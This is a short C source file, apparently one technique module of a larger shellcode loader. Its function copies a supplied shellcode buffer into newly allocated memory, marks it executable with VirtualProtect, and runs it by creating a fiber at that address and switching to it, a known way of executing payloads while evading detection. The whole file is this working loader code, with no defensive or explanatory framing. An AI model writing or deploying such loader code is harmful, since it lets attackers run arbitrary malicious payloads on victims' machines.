#include "../dispatch.h"

BOOL tech_fiber(unsigned char *sc, size_t len) {
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) return FALSE;

    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    LPVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (!scFiber) return FALSE;
    SwitchToFiber(scFiber);
    DeleteFiber(scFiber);
    return TRUE;
}
